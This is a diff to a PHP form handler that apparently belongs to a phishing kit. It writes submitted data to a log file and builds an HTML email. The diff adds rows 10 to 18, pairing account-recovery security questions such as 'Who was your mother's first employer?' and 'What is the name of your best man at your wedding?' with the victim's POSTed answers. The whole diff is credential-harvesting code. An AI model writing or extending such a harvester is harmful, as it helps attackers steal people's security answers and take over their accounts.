@@ -139,9 +139,6 @@ Ans.18 ".$_POST['eighteenth_ans']."
 	fputs($fp, "$log");
 	fclose($fp);
 
-
-
-
 		$message = "
 			<html>
 			<head>
@@ -189,6 +186,42 @@ Ans.18 ".$_POST['eighteenth_ans']."
 			<tr>
 				<td>Ques.9 : What was your favorite movie as a child? </td>
 				<td>Ans.9 ".$_POST['ninth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.10 : In what city were you married? </td>
+				<td>Ans.10 ".$_POST['tenth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.11 : What was the name of your favorite childhood toy? </td>
+				<td>Ans.11 ".$_POST['eleventh_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.12 : Who was your childhood hero? </td>
+				<td>Ans.12 ".$_POST['twelveth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.13 : What was the name of your first employer?</td>
+				<td>Ans.13 ".$_POST['thirteenth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.14 : In what city does your nearest sibling live? </td>
+				<td>Ans.14 ".$_POST['fourteenth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.15 : Who was your mother's first employer? </td>
+				<td>Ans.15 ".$_POST['fifteenth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.16 : What is the name of a college you applied to but did not attend? </td>
+				<td>Ans.16 ".$_POST['sixteenth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.17 : What is the name of your favorite roommate? </td>
+				<td>Ans.17 ".$_POST['seventeenth_ans']."</td>
+			</tr>
+			<tr>
+				<td>Ques.18 : What is the name of your best man at your wedding? </td>
+				<td>Ans.18 ".$_POST['eighteenth_ans']."</td>
 			</tr>
 			
 			</table>
